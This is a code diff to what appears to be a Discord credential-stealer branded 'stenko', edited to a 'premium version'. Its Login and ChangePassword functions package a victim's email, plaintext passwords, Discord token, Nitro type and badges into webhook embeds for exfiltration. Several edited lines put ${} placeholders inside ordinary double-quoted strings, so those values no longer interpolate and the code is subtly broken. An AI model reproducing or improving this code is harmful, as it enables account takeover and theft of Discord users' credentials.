@@ -152,13 +152,13 @@ function Login(email, password, token) {
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " username",
-			    "value": ` - ` + json.username + `#` + json.discriminator,
+                            "name": " name",
+			    "value": " - " + json.username + "#" + json.discriminator,
                             "inline": true
                         },
                         {
-                            "name": " userid",
-                            "value": ` - ` + json.id,
+                            "name": " id",
+                            "value": " - " + json.id,
                             "inline": true
                         },
                         {
@@ -168,12 +168,12 @@ function Login(email, password, token) {
                         },
                         {
                             "name": " email",
-                            "value": ` - \`${email}\``,
+                            "value": " - ${email}",
                             "inline": true
                         },
                         {
                             "name": " password",
-                            "value": ` - \`${password}\``,
+                            "value": " - ${password}",
                             "inline": true
                         },
                         {
@@ -182,13 +182,28 @@ function Login(email, password, token) {
                             "inline": false
                         },
                         {
+                            "name": " nitro type",
+                            "value": " - ${GetNitro(json.premium_type)}",
+                            "inline": false
+                        },
+                        {
+                            "name": " badges",
+                            "value": " - ${GetBadges(json.flags)}",
+                            "inline": false
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": "᲼᲼᲼᲼",
+                            "inline": false
+                        },
+                        {
                             "name": " token",
-                            "value": ` - \`${token}\``,
+                            "value": " - ${token}",
                             "inline": false
                         }
                     ],
                     "author": {
-                        "name": "stenko",
+                        "name": "stenko premium version",
 			"url": `https://stenko.xyz`,
                     },
 		    "thumbnail": {
@@ -227,34 +242,59 @@ function ChangePassword(oldpassword, newpassword, token) {
                     {
                         "color": 3092790,
                        "fields": [
-                        {
-                            "name": " username",
-			    "value": json.username + "#" + json.discriminator,
-                            "inline": false
-                        },
-                        {
-                            "name": " userid",
-                            "value": json.id,
-                            "inline": true
-                        },
                             {
-                                "name": "**Password Changed**",
-                                "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                                "name": " name",
+			        "value": " - " + json.username + "#" + json.discriminator,
                                 "inline": true
                             },
                             {
-                                "name": "**Other Info**",
-                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "name": " id",
+                                "value": " - " + json.id,
                                 "inline": true
                             },
                             {
-                                "name": "**Token**",
-                                "value": `\`${token}\``,
+                                "name": "᲼᲼᲼᲼",
+                                "value": "᲼᲼᲼᲼",
+                                "inline": false
+                            },
+                            {
+                                "name": " email",
+                                "value": " - ${json.email}",
+                                "inline": true
+                            },
+                            {
+                                "name": " new password",
+                                "value": " - ${newpassword}",
+                                "inline": true
+                            },
+                            {
+                                "name": "᲼᲼᲼᲼",
+                                "value": "᲼᲼᲼᲼",
+                                "inline": false
+                            },
+                            {
+                                "name": " nitro type",
+                                "value": " - ${GetNitro(json.premium_type)}",
+                                "inline": false
+                            },
+                            {
+                                "name": " badges",
+                                "value": " - ${GetBadges(json.flags)}",
+                                "inline": false
+                            },
+                            {
+                                "name": "᲼᲼᲼᲼",
+                                "value": "᲼᲼᲼᲼",
+                                "inline": false
+                            },
+                            {
+                                "name": " token",
+                                "value": " - ${token}",
                                 "inline": false
                             }
                         ],
                         "author": {
-                            "name": "stenko",
+                            "name": "stenko premium version",
 		 	    "url": `https://stenko.xyz`,
                         },
 		        "thumbnail": {
